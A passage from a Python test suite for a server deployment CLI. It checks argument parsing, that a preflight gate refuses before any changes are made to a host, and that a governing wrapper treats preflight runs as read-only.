            [HOST, "deploy", SERVICE, "--repair-action=apply", "--run"])
        self.assertIn("two arguments: --repair-action <value>", err)

    def test_reason_value_starting_with_dash_is_a_value_not_a_flag(self):
        self.w.verify_ok = False
        rc, _, err, _ = self._cli([HOST, "deploy", SERVICE, "--preflight",
                                   "--allow-unhealthy-baseline", "--reason", "--rnu is a value"])
        self.assertEqual(rc, 1, err)
        rec = json.loads((journal.JOURNAL_DIR / "preflight.jsonl").read_text().splitlines()[-1])
        self.assertEqual(rec["reason"], "--rnu is a value")

    def test_valid_combinations_unchanged(self):
        self.assertEqual(self._cli([HOST, "deploy", SERVICE, "--preflight"])[0], 0)
        rc, out, _, _ = self._cli([HOST, "deploy", SERVICE, "--preflight", "--json"])
        self.assertEqual(json.loads(out)["exit_code"], rc)
        rc, _, _, apply = self._cli([HOST, "deploy", SERVICE, "--run", "--reason", "ship"])
        self.assertEqual(rc, 0)
        apply.assert_called_once()


class ExecutorGateHookTest(Base):
    def test_executor_runs_gate_under_lock_and_refuses_before_mutation(self):
        calls = []

        def ssh(host, cmd, timeout=120):
            calls.append(cmd)
            return 0, "", ""
        c = dict(self.contract)
        with self.assertRaises(Refused):
            executor.apply(Guard(_policy(), True), c, "deploy", HOST,
                           "container:edge1/shop-frontend", ["docker restart shop-frontend"],
                           reason="t", ssh=ssh, run_local=lambda a, timeout=300: (0, "", ""),
                           checks=lambda c, h: (True, []),
                           preflight=lambda: preflight.require_fresh(c, HOST, token="t"))
        self.assertFalse(any("tar czf" in x or "restart" in x for x in calls))
        self.assertTrue(any("rmdir" in x for x in calls))  # lock released, nothing started


class WrapperDoorTest(unittest.TestCase):
    """Both doors classify `deploy --preflight` as a read: the governor lets it
    through as allowed_read (a tmpdir copy of the doors, no network), and the
    package then refuses for want of a contract — never reaching a host.

    The governor is the example estate's, with `deploy` allowed; tests/estate/
    reruns this against the estate's own governor."""

    DOOR_HOST = "edge1"   # posture test in the example estate

    def install_governor(self, dest):
        gov = json.loads((REPO / "contrib" / "example-estate" / "vpscfg-control.json").read_text())
        gov["allowed_verbs"].append("deploy")
        dest.write_text(json.dumps(gov, indent=2))

    def test_preflight_is_a_read_in_the_outer_door(self):
        import os
        import shutil
        import subprocess
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            shutil.copy(REPO / "vpscfg-control.py", root / "vpscfg-control.py")
            self.install_governor(root / "vpscfg-control.json")
            shutil.copytree(REPO / "vpscfg", root / "vpscfg",
                            ignore=shutil.ignore_patterns("__pycache__"))
            env = {k: v for k, v in os.environ.items() if not k.startswith("VPSCFG_")}
            env["HOME"] = str(root)
            env.pop("VPSCFG_TELEMETRY_KEY", None)
            r = subprocess.run([sys.executable, str(root / "vpscfg-control.py"), self.DOOR_HOST, "deploy",
                                "no-such-service", "--preflight", "--json"],
                               capture_output=True, text=True, timeout=30, cwd=str(root), env=env)
            self.assertEqual(r.returncode, 2)
            self.assertIn("no contract named", r.stderr)
            events = [json.loads(l)["event"] for l in
                      (root / "journal" / "control.jsonl").read_text().splitlines()]
            self.assertEqual(events, ["allowed_read"])


if __name__ == "__main__":
    unittest.main()
